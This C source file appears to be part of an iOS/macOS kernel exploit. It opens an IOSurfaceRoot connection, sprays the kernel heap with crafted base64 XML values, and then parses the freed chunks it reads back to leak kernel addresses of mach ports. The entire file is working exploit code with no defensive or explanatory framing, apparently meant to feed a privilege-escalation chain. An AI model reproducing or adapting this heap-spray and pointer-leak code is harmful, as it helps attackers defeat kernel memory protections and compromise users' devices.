#include "iosurface.h"

char* createZeroesXML();
char* createPortPointersXML(mach_port_t target, mach_port_t own_task, mach_port_t host);

io_connect_t openIOSurfaceConnection() {
    kern_return_t err;

	CFMutableDictionaryRef matching = IOServiceMatching("IOSurfaceRoot");
	if (!matching) {
		printf("Unable to create service matching dictionary\n");
		return MACH_PORT_NULL;
	}

	io_iterator_t iterator;
	err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);

	if (err != KERN_SUCCESS) {
		printf("no matches\n");
		return MACH_PORT_NULL;
	}

	io_service_t service = IOIteratorNext(iterator);

	if (service == IO_OBJECT_NULL) {
		printf("unable to find service\n");
		return MACH_PORT_NULL;
	}
	printf("got service: %x\n", service);

	io_connect_t conn = MACH_PORT_NULL;
	err = IOServiceOpen(service, mach_task_self(), 0, &conn);
	if (err != KERN_SUCCESS) {
		printf("unable to get user client connection\n");
		return MACH_PORT_NULL;
	}
	printf("got user client connection: %x\n", conn);
	return conn;
}

uint32_t createSurface(io_connect_t conn) {
    kern_return_t err;

	char* input_string = "<dict><key>IOSurfaceAllocSize</key><integer>32</integer></dict>";
	create_surface_output_t output_struct;
	size_t output_size = sizeof(output_struct);
	err = IOConnectCallStructMethod(conn, CREATE_SURFACE,
				    input_string, strlen(input_string) + 1,
				    &output_struct, &output_size);

	if (err != KERN_SUCCESS) {
		printf("Create Surface Failed: %x\n", err);
		return 0;
	} else {
		// printf("Successfully Created Surface\n");
	}

    return output_struct.data.id;
}

int setValue(io_connect_t conn, uint32_t surface_id, char* b64_data) {
    kern_return_t err;
	uint8_t* input_struct;

	size_t input_string_size = strlen(b64_data);
	size_t input_struct_size = sizeof(uint32_t) + input_string_size + 1;
	input_struct = malloc(input_struct_size);
	
    memcpy(input_struct, &surface_id, sizeof(uint32_t));
    memcpy(input_struct+sizeof(uint32_t), b64_data, input_string_size+1);

	err = IOConnectCallStructMethod(conn, SET_VALUE,
				    input_struct, input_struct_size,
				    NULL, NULL);

	if (err != KERN_SUCCESS) {
		printf("Set Value Failed: %x\n", err);
		return 1;
	} else {
		// printf("Successfully Set Value\n");
	}

	free(input_struct);

    return 0;
}


int setValueZeroes(io_connect_t conn, uint32_t surface_id) {
	char* input_string;
	int ret;
	input_string = createZeroesXML();
	ret = setValue(conn, surface_id, input_string);
	free(input_string);
	return ret;
}

int setValuePorts(io_connect_t conn, uint32_t surface_id, mach_port_t target, mach_port_t own_task, mach_port_t host) {
	char* input_string;
	int ret;
	input_string = createPortPointersXML(target, own_task, host);
	ret = setValue(conn, surface_id, input_string);
	free(input_string);
	return ret;
}

#define GET_VALUE_OUTPUT 0x60000

int getValue(io_connect_t conn, uint32_t surface_id, uint32_t* target_port_kp, uint32_t* own_task_port_kp, uint32_t* mach_host_self_kp) {
    kern_return_t err;
	uint8_t* input_struct;
	size_t input_size, output_size;
	char output_buf[GET_VALUE_OUTPUT];
	char b64_encoded_buf[45]; // size of data eg 4KIeke++rd7vvq3e776t3u++rd7vvq3e776t3g==

	*target_port_kp = 0;
	*own_task_port_kp = 0;
	*mach_host_self_kp = 0;

    input_size = sizeof(uint32_t) + sizeof(uint64_t);
    input_struct = calloc(input_size, sizeof(char));

    *(uint32_t *)input_struct = surface_id;
    *((uint64_t *)input_struct + sizeof(uint32_t)) = 0x0000007961727073; // ASCII "spray"

	output_size = GET_VALUE_OUTPUT;

	err = IOConnectCallStructMethod(conn, GET_VALUE,
				    input_struct, input_size,
				    output_buf, &output_size);

	if (err != KERN_SUCCESS) {
		printf("Get Value Failed: %x\n", err);
		return 1;
	}
	free(input_struct);

	bzero(b64_encoded_buf, 41);
	char* str_ptr = output_buf + 43; // skips initial "<dict ID="0"><key>spray</key><array ID="1">"
	int i = 0;
	while ((str_ptr = strstr(str_ptr, "\">"))) {
		str_ptr += 2; // skip the ">
		memcpy(b64_encoded_buf, str_ptr, 44);
		if (strncmp(b64_encoded_buf, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", 44)) { // found one that does not match
			printf("found freed chunk: [%s]\n", b64_encoded_buf);
			size_t size;
			uint8_t* decoded = b64ToBytes(b64_encoded_buf, &size);
			printf("size: %zu\n", size);
			for (int i = 0; i < size / sizeof(int); i++) {
				printf("found freed chunk (decoded as int): [0x%x]\n", ((int*)decoded)[i]);
				if ( ((mach_port_t*)decoded)[i] ) {
					if (!*target_port_kp)
						*target_port_kp = ((mach_port_t*)decoded)[i];
					else if (!*own_task_port_kp)
						*own_task_port_kp = ((mach_port_t*)decoded)[i];
					else if (!*mach_host_self_kp)
						*mach_host_self_kp = ((mach_port_t*)decoded)[i];
					else {
						printf("Too much data\n");
						// return 1;
					}
				}
			}
		}
		if (i > 1024) {
			break;
		}
		// printf("%d [%s]\n", i, b64_encoded_buf);
		i++;
	}

	if (*target_port_kp && *own_task_port_kp && *mach_host_self_kp) {
		printf("leaked target_port_kp: 0x%x own_task_port_kp: 0x%x mach_host_self_kp: 0x%x\n", *target_port_kp, *own_task_port_kp, *mach_host_self_kp);
	} else {
		printf("Failed to leak kernel pointers of mach ports\n");
		return 1;
	}

    return 0;
}

char* createZeroesXML() {
	char* start_str = "<array><array>";
	char* end_str = "</array><string>spray</string></array>";

	uint8_t* zeroes = calloc(XML_DATA_SIZE, sizeof(uint8_t));
	char* zeroes_b64_str = bytesToB64(zeroes, XML_DATA_SIZE);
	free(zeroes);
	char* data_str = calloc(strlen("<data></data>") + strlen(zeroes_b64_str) + 1, sizeof(char));
	memcpy(data_str, "<data>", strlen("<data>"));
	memcpy(data_str+strlen("<data>"), zeroes_b64_str, strlen(zeroes_b64_str));
	memcpy(data_str+strlen("<data>")+strlen(zeroes_b64_str), "</data>", strlen("</data>"));
	free(zeroes_b64_str);

	size_t start_size = strlen(start_str);
	size_t data_size = strlen(data_str);
	size_t data_size_total = data_size * 1024;
	size_t end_size = strlen(end_str);
	size_t xml_size = start_size + data_size_total + end_size;

	char* xml_str = calloc(xml_size + 1, sizeof(char));
	memcpy(xml_str, start_str, start_size);
	for (int i = 0; i < 1024; i++) {
		memcpy(xml_str+start_size+(i*data_size), data_str, data_size);
	}
	memcpy(xml_str+start_size+data_size_total, end_str, end_size);
	return xml_str;
}

char* createPortPointersXML(mach_port_t target, mach_port_t own_task, mach_port_t host) {
	char* start_str = "<array><array>";
	char* end_str = "</array><string>spray2</string></array>";

	uint32_t* pointers = calloc(XML_DATA_SIZE, sizeof(uint8_t));
	// pointers[1] = target; 	// 0x4
	pointers[2] = target; 	// 0x8
	pointers[3] = target; // 0xc
	// pointers[3] = own_task; // 0xc
	// pointers[4] = host;		// 0x10
	char* pointers_b64_str = bytesToB64((uint8_t*)pointers, XML_DATA_SIZE);
	free(pointers);
	char* data_str = calloc(strlen("<data></data>") + strlen(pointers_b64_str) + 1, sizeof(char));
	memcpy(data_str, "<data>", strlen("<data>"));
	memcpy(data_str+strlen("<data>"), pointers_b64_str, strlen(pointers_b64_str));
	memcpy(data_str+strlen("<data>")+strlen(pointers_b64_str), "</data>", strlen("</data>"));
	free(pointers_b64_str);

	size_t start_size = strlen(start_str);
	size_t data_size = strlen(data_str);
	size_t data_size_total = data_size * 1024;
	size_t end_size = strlen(end_str);
	size_t xml_size = start_size + data_size_total + end_size;

	char* xml_str = calloc(xml_size + 1, sizeof(char));
	memcpy(xml_str, start_str, start_size);
	for (int i = 0; i < 1024; i++) {
		memcpy(xml_str+start_size+(i*data_size), data_str, data_size);
	}
	memcpy(xml_str+start_size+data_size_total, end_str, end_size);
	return xml_str;
}
